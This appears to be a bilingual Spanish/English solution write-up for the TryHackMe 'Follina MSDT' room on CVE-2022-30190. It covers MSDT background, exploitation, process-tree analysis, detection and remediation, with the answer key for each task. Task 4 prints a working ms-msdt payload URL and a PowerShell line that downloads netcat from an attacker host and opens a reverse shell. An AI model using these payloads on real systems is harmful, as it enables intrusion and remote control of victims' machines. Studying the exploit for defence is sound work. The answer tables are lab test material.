# Follina MSDT
| **Dificultad** | Medium |
| **Tipo** | Walkthrough (Red/Blue) |
| **Slug** | `follinamsdt` |
| **Link** | [TryHackMe](https://tryhackme.com/room/follinamsdt) |
| **Sección** | 02 Level Medium |
| **Fuente** | Web (TryHackMe room `follinamsdt` + walkthroughs públicos: thmrevenant, jesusgavancho, Hasanka Amarasinghe) |
| **Componentes** | Windows, CVE-2022-30190 (Follina), Microsoft Support Diagnostic Tool (MSDT), Office/maldoc, manejador `ms-msdt`, PowerShell, reverse shell netcat, Windows Tasks, Process Explorer, detección/DFIR |
| **Impacto** | Ejecución remota de código sin macros al abrir un documento Office (maldoc) que invoca el protocolo `ms-msdt`; la room cubre teoría de MSDT, anatomía del exploit, explotación con PoC, análisis del árbol de procesos y detección/remediación. |
---
**Contexto:** Follina (**CVE-2022-30190**) es una vulnerabilidad de ejecución de código en el manejador del protocolo `ms-msdt` (Microsoft Support Diagnostic Tool) que se dispara al abrir un documento Office malicioso, sin necesidad de macros ni de interacción compleja del usuario. La room recorre el ciclo ofensivo/defensivo completo: qué es MSDT, cómo se descubrió la vulnerabilidad, la anatomía del exploit, su explotación real con el PoC público, el análisis del árbol de procesos (`WINWORD.EXE` → `msdt.exe` → `sdiagnhost.exe`) y por último las técnicas de detección y remediación.
*EN: Follina (**CVE-2022-30190**) is a code-execution vulnerability in the `ms-msdt` (Microsoft Support Diagnostic Tool) protocol handler that triggers when a malicious Office document is opened, without macros or complex user interaction. The room covers the full offensive/defensive cycle: what MSDT is, how the vulnerability was discovered, the exploit anatomy, its real exploitation with the public PoC, the process-tree analysis (`WINWORD.EXE` → `msdt.exe` → `sdiagnhost.exe`) and finally detection and remediation.*
## Solucionario
### Task 1: Introducción / Introduction
**Explicación:** Presentación de la room: se estudia el **Microsoft Support Diagnostic Tool (MSDT)**, el servicio de soporte que permite generar diagnósticos, y la vulnerabilidad **CVE-2022-30190** (Follina) descubierta en 2022. La room es de tipo walkthrough con partes de ataque (explotación del maldoc) y de defensa (detección del árbol de procesos y remediación). Pregunta inicial de conformidad, sin respuesta.
*EN: Room introduction: the **Microsoft Support Diagnostic Tool (MSDT)**, the support service that generates diagnostics, and the **CVE-2022-30190** (Follina) vulnerability disclosed in 2022 are studied. The room is a walkthrough with an attack part (exploiting the maldoc) and a defense part (process-tree detection and remediation). Initial agreement question, no answer.*
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | I understand the learning objectives and am ready to get started. | `No answer needed` |
### Task 2: MSDT 101 / CVE-2022-30190
**Explicación:** Contexto histórico de la vulnerabilidad. La MSDT fue introducida en **2020** y su primera descripción detallada aparece en una tesis de bachelor de **Benjamin Altpeter**. La evidencia de explotación *in the wild* contra el servicio MSDT fue reportada a MSRC por el grupo de caza de APT **Shadowchasing1** (Twitter), lo que dio origen al identificador CVE-2022-30190 y al apodo "Follina".
*EN: Historical context. MSDT was introduced in **2020** and its first detailed description appears in a bachelor's thesis by **Benjamin Altpeter**. Evidence of in-the-wild exploitation of MSDT was reported to MSRC by the APT-hunting group **Shadowchasing1** (Twitter), giving rise to CVE-2022-30190 and the "Follina" nickname.*
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What year was MSDT first discovered to be vulnerable to code execution? | `2020` |
| 2 | Who is the author of the bachelor's thesis which first detailed this vulnerability? | `Benjamin Altpeter` |
| 3 | What is the name of the APT hunting group who first reported evidence of exploitation in the wild of MSDT to MSRC? | `Shadowchasing1` |
### Task 3: El Servicio MSDT / The MSDT Service
**Explicación:** Uso legítimo de MSDT: cuando un usuario solicita soporte, el técnico le entrega una **passkey** (clave de acceso) que se introduce para que la herramienta genere un informe de diagnóstico que después se envía al técnico. En el abuso de la vulnerabilidad, ese mismo flujo de diagnóstico es el que permite invocar comandos arbitrarios a través del protocolo `ms-msdt`.
*EN: Legitimate use of MSDT: when a user requests support, the technician provides a **passkey** that is entered so the tool generates a diagnostic report that is then sent back. In the vulnerability abuse, that same diagnostic workflow is what allows invoking arbitrary commands through the `ms-msdt` protocol.*
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What's one thing you need that the support will provide you when you're using the MSDT legitimately? | `Passkey` |
### Task 4: Explotando la Vulnerabilidad Follina / Exploiting the Follina Windows Vulnerability
**Explicación:** Explotación real abriendo un documento Office malicioso (**maldoc**). Al abrirlo, `WINWORD.EXE` lanza el manejador `ms-msdt` con un payload embebido que provoca ejecución de código. El PoC (John Hammond, `msdt-follina`) construye una URL `ms-msdt:/` con el parámetro `IT_BrowseForFile` que ejecuta el comando base64 embebido y termina apuntando a `mpsigstub.exe` para eludir restricciones:
```
ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebrowseForFile=cal?c IT_SelectProgram=NotListed IT_BrowseForFile=h$(IEX('calc.exe'))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe"
```
El PoC también puede montar una reverse shell: descarga `nc.exe` en `C:\Windows\Tasks` y lo ejecuta contra el atacante.
```
Invoke-WebRequest http://<ATTACKER>/nc64.exe -OutFile C:\Windows\Tasks\nc.exe; C:\Windows\Tasks\nc.exe -e cmd.exe <ATTACKER> <PORT>
```
En el análisis del árbol de procesos, los dos procesos padre interesantes son **WINWORD.EXE** y **sdiagnhost.exe**: `WINWORD.EXE` es el padre de `msdt.exe` y `sdiagnhost.exe` es el padre de `conhost.exe`/`calc.exe`. La presencia de **prevhost.exe** es la evidencia más clara de la variante "*Zero Click*" del exploit.
*EN: Real exploitation by opening a malicious Office document (**maldoc**). On opening, `WINWORD.EXE` launches the `ms-msdt` handler with an embedded payload that causes code execution. The PoC (John Hammond, `msdt-follina`) builds an `ms-msdt:/` URL with the `IT_BrowseForFile` parameter that runs the base64-embedded command and points to `mpsigstub.exe` to bypass restrictions. The PoC can also establish a reverse shell downloading `nc.exe` into `C:\Windows\Tasks`. In the process tree the two interesting parents are **WINWORD.EXE** and **sdiagnhost.exe**: `WINWORD.EXE` is the parent of `msdt.exe` and `sdiagnhost.exe` is the parent of `conhost.exe`/`calc.exe`. The presence of **prevhost.exe** is the clearest evidence of the "Zero Click" variant.*
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What application got executed upon opening of the maldoc that signified compromise? Answer format is "<app>.exe" | `win32calc.exe` |
| 2 | What is the filename of the .docx file that has been discovered in the wild? Write it exactly as you see it. | `05-2022-0438.doc` |
| 3 | The PoC that we used has the capability to establish a reverse shell upon exploit - what binary is being used to accomplish this? | `netcat` |
| 4 | Where is this binary being downloaded? | `C:\Windows\Tasks` |
| 5 | In the original exploit execution, two parent processes are of interest in the list of running processes in Process Explorer, one of them is WINWORD.EXE. Can you find the other one? | `sdiagnhost.exe` |
| 6 | What is the child process of WINWORD.EXE? | `msdt.exe` |
| 7 | What is the child process of the other interesting parent process? | `conhost.exe` |
| 8 | What process would be the most obvious piece of evidence to conclude that the "Zero Click" implementation of the exploit was used? | `prevhost.exe` |
### Task 5: Detección / Detection
**Explicación:** Análisis de evidencia en ejecución. La cadena `Y2FsYw==` está codificada en **base64** (decodifica a `calc`), técnica habitual del payload. El proceso `calc.exe` tiene como padre a **sdiagnhost.exe**, el host de diagnóstico que ejecuta la funcionalidad invocada por MSDT. La información del índice de paquetes de diagnóstico se carga desde la ruta **C:\Windows\Diagnostics\Index**, un artefacto clave para correlacionar la ejecución legítima con el abuso del servicio.
*EN: Runtime evidence analysis. The string `Y2FsYw==` is **base64**-encoded (decodes to `calc`), a common payload technique. `calc.exe` has **sdiagnhost.exe** as its parent, the diagnostic host that executes the functionality invoked by MSDT. Diagnostic package index information is loaded from **C:\Windows\Diagnostics\Index**, a key artifact to correlate legitimate execution with abuse.*
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What encoding is used in the string Y2FsYw== | `base64` |
| 2 | What is the parent process of calc.exe? | `sdiagnhost.exe` |
| 3 | Diagnostic package index information is loaded from what file path? | `C:\Windows\Diagnostics\Index` |
### Task 6: Remediación / Remediation
**Explicación:** Indicador visible al usuario: al abrir el documento sin el componente/registro adecuado, Windows muestra el mensaje **"You'll need a new app to open this ms-msdt"** (necesitas una nueva aplicación para abrir este ms-msdt). La remediación incluye deshabilitar/eliminar la asociación del protocolo `ms-msdt`, aplicar los parches de Microsoft y monitorizar la creación de procesos desde aplicaciones Office.
*EN: User-visible indicator: when opening the document without the proper component/registration, Windows shows **"You'll need a new app to open this ms-msdt"**. Remediation includes disabling/removing the `ms-msdt` protocol association, applying Microsoft patches and monitoring process creation from Office applications.*
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What error message did the document give upon opening? | `You'll need a new app to open this ms-msdt` |
### Task 7: Repaso de la Room / Room Recap
**Explicación:** Cierre de la room: repaso de CVE-2022-30190, del flujo de explotación vía maldoc y de las técnicas de detección/remediación. Se recomienda seguir los desarrollos recientes sobre Follina y variantes de ataque a manejadores de protocolo en Windows. Pregunta final de conformidad, sin respuesta.
*EN: Room wrap-up: recap of CVE-2022-30190, the maldoc exploitation flow and detection/remediation techniques. Continuing with recent developments on Follina and protocol-handler attack variants on Windows is recommended. Final agreement question, no answer.*
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Room complete! | `No answer needed` |
---
**Metodología:** Reconocimiento teórico (MSDT/CVE-2022-30190) → comprensión del uso legítimo y del abuso del protocolo `ms-msdt` → generación del maldoc con el PoC → ejecución en la víctima Windows → análisis del árbol de procesos en Process Explorer → decodificación del payload base64 → localización de artefactos (`C:\Windows\Tasks`, `C:\Windows\Diagnostics\Index`) → detección y remediación.
**Learning chain:** qué es MSDT → cómo nace Follina → cómo se construye el maldoc → qué procesos delata la explotación → cómo se codifica el payload → cómo se detecta y mitiga a nivel de host.
**Lección:** *Los manejadores de protocolo de Windows (como `ms-msdt`) son superficie de ataque real: un simple documento abierto puede derivar en RCE sin macros; la defensa pasa por parchear, deshabilitar asociaciones innecesarias y monitorizar la creación de procesos hijos de aplicaciones Office.*
**MITRE ATT&CK:** T1204.002 (User Execution: Malicious File), T1218 (System Binary Proxy Execution), T1059.001 (PowerShell), T1059.003 (Windows Command Shell), T1105 (Ingress Tool Transfer), T1566.001 (Phishing: Spearphishing Attachment).
**Fuente:** [TryHackMe - Follina MSDT](https://tryhackme.com/room/follinamsdt)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
